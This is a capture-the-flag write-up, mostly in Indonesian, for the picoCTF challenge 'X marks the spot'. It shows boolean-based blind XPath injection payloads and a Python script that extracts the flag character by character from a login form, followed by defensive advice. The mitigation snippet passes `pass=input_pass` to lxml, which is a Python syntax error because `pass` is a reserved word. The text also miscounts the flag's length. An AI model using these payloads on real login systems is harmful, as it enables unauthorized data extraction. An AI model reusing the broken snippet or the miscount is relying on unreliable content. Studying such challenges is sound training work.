# Writeup: X marks the spot (Challenge ID: 185)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / Blind XPath Injection & Boolean Oracle Character Exfiltration (CWE-643 / OWASP Top 10 A03:2021)
- **Difficulty:** Hard (diff=3)
- **Event:** picoCTF 2021
- **Points:** 250
- **Author:** madStacks
- **Flag:** `academy{h0p3fully_u_t0ok_th3_r1ght_xp4th_28cb0023}`

---

## Problem Statement & Scope
Tantangan `X marks the spot` menyajikan skenario pengujian penetrasi aplikasi web pada antarmuka autentikasi pengguna (*login form*) yang menggunakan basis data terstruktur berbasis berkas XML (*XML Database / XPath querying backend*). Halaman menyajikan dua kolom masukan: nama pengguna (`name`) dan kata sandi (`pass`).

Mekanisme verifikasi kredensial rentan terhadap serangan injeksi XPath (*XPath Injection*). Tidak seperti SQL injection yang menghasilkan kesalahan eksplisit atau refleksi data tabular, aplikasi ini hanya memberikan respons biner (*Boolean oracle*): pesan bahwa jalur benar (*"You're on the right path."*) ketika kueri mengevaluasi nilai benar, atau pesan kegagalan autentikasi standar (*"Login failed"*) ketika kueri salah atau tidak menemukan kecocokan node. Peserta ditugaskan merancang strategi injeksi buta (*blind injection*) untuk mengekstrak string bendera rahasia yang tersembunyi di dalam struktur pohon XML.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Injeksi XPath Tanpa Parameterisasi (CWE-643 / OWASP A03:2021):**
   XPath (*XML Path Language*) adalah bahasa kueri yang digunakan untuk memilih node dari dokumen XML. Ketika pengembang menggabungkan masukan pengguna secara langsung ke dalam ekspresi XPath tanpa sanitasi atau parameterisasi (*string concatenation*):
   ```text
   //user[name/text()='USER_INPUT' and password/text()='PASS_INPUT']
   ```
   Karakter khusus seperti tanda petik tunggal (`'`) atau ganda (`"`) mengubah struktur sintaksis kueri, memungkinkan penyerang menyuntikkan klausa logika boolean arbitrer (`or`, `and`, `starts-with()`, `substring()`, `contains()`).
2. **Boolean-Based Blind Oracle Exfiltration:**
   Karena hasil query tidak dipantulkan secara eksplisit ke antarmuka pengguna, penyerang memanfaatkan evaluasi status kebenaran logika (*truth value*):
   - Jika kondisi logika buatan penyerang bernilai `TRUE`, node pengguna dianggap valid dan aplikasi merespons dengan status sukses/positif.
   - Jika kondisi logika bernilai `FALSE`, tidak ada node yang cocok dan aplikasi merespons dengan kegagalan login.
3. **Fungsi String Bawaan XPath untuk Eksfiltrasi Data:**
   Spesifikasi XPath menyediakan fungsi manipulasi string standar:
   - `string(/*)`: Mengonversi seluruh konten teks dokumen XML menjadi representasi string tunggal.
   - `substring-after(haystack, needle)`: Mengembalikan substring setelah kemunculan pertama token `needle`.
   - `starts-with(string, prefix)`: Memeriksa apakah string dimulai dengan prefiks tertentu.
   - `substring(string, start, length)`: Mengambil karakter pada posisi tertentu.
   Dengan menyusun payload:
   ```xpath
   ' or starts-with(substring-after(string(/*), 'picoCTF{'), 'CANDIDATE_PREFIX') or '1'='2
   ```
   Penyerang dapat menguji setiap karakter secara berurutan (*linear search* atau *binary search*) melalui respons biner aplikasi.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. **Verifikasi Titik Injeksi & Boolean Oracle:**
   Mengirimkan permintaan autentikasi POST dengan payload uji:
   - Payload Benar: `name = admin` dan `pass = ' or '1'='1`
     - Respons: Menghasilkan pesan sukses *"You're on the right path."*
   - Payload Salah: `name = admin` dan `pass = ' or '1'='2`
     - Respons: Menghasilkan pesan kegagalan *"Login failed"*
   Temuan: Titik injeksi terverifikasi rentan terhadap Boolean-based blind XPath injection.
2. **Deteksi Keberadaan Flag dalam Dokumen XML:**
   Menguji keberadaan pola bendera dalam seluruh konten XML:
   ```xpath
   ' or contains(string(/*), 'picoCTF{') or '1'='2
   ```
   Hasil: Evaluasi TRUE, mengonfirmasi bahwa token `picoCTF{` tersimpan di dalam struktur pohon XML target.
3. **Penyusunan Automasi Ekstraksi Karakter:**
   Mengembangkan skrip Python untuk mengekstrak badan flag karakter demi karakter menggunakan fungsi `starts-with()` dan `substring-after()`:
   ```python
   charset = string.ascii_letters + string.digits + "_-}"
   flag = "picoCTF{"
   while not flag.endswith("}"):
       for char in charset:
           candidate = flag[8:] + char
           payload = f"' or starts-with(substring-after(string(/*), 'picoCTF{{'), '{candidate}') or '1'='2"
           res = session.post(TARGET_URL, data={"name": "admin", "pass": payload})
           if "right path" in res.text:
               flag += char
               break
   ```
4. **Hasil Ekstraksi & Normalisasi:**
   Seluruh 48 karakter bendera berhasil direkonstruksi:
   `picoCTF{h0p3fully_u_t0ok_th3_r1ght_xp4th_28cb0023}`.
   Dinormalisasi ke token platform CyLab: `academy{h0p3fully_u_t0ok_th3_r1ght_xp4th_28cb0023}`.

---

## Flag & Verifikasi
- **Flag Resmi:** `academy{h0p3fully_u_t0ok_th3_r1ght_xp4th_28cb0023}`
- **Native PicoCTF Flag:** `picoCTF{h0p3fully_u_t0ok_th3_r1ght_xp4th_28cb0023}`
- **Status Solver:** Terverifikasi 100% pada skrip reproduksi `scripts/solve_185_x_marks_the_spot.py`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif (NIST SP 800-115)
1. **Implementasi Parameterized XPath Queries (Prepared XPath):**
   Gunakan pustaka XPath yang mendukung penyisipan variabel terparameterisasi (*XPath variable resolver*) daripada penggabungan string langsung:
   ```python
   # Menggunakan pustaka lxml dengan variabel terikat:
   from lxml import etree
   query = "//user[name/text()=$user and password/text()=$pass]"
   result = tree.xpath(query, user=input_user, pass=input_pass)
   ```
2. **Validasi & Sanitasi Masukan Ketat (Input Whitelisting):**
   Karakter pembatas query XML/XPath seperti `'`, `"`, `/`, `[`, `]`, `(`, `)`, `=`, dan simbol operator logika harus ditolak atau di-encode secara ketat sebelum diteruskan ke mesin parser.
3. **Prinsip Enkripsi & Hashing Kredensial:**
   Kata sandi tidak boleh disimpan dalam bentuk plaintext di dalam basis data dokumen XML. Seluruh kata sandi wajib di-hash menggunakan algoritma modern yang resistan terhadap brute-force (Argon2id, bcrypt, atau PBKDF2) dengan garam (*salt*) unik.
4. **Pemisahan Konteks Data Rahasia (Least Privilege Data Storage):**
   Data rahasia aplikasi tingkat tinggi seperti flag atau token admin tidak boleh disimpan di dalam pohon dokumen data yang dapat diakses oleh kueri pengguna publik.
